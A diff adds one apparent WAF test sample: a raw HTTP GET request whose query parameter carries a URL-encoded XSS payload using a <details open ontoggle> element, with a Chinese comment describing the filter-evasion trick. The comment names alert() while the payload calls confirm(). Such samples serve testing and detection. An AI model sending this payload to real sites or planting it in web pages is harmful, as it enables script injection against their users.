@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件-06506856
+# 攻击载荷利用<details>元素的open属性和ontoggle事件来执行alert()函数，弹出一个警告框。使用不常用标签或事件处理器，半开标签。
+GET /?id=%3Cdetails%2Fopen%2Fontoggle=%28confirm%29%28%29%2F%2F&bid=hd_tag_m8mv24xw HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24xw
+RM-PRO-Token: eb624370f9a3461068fd218684d54c3e
+RM-PRO-Time: 1742808422659
+User-Agent: curl/7.83.1
+
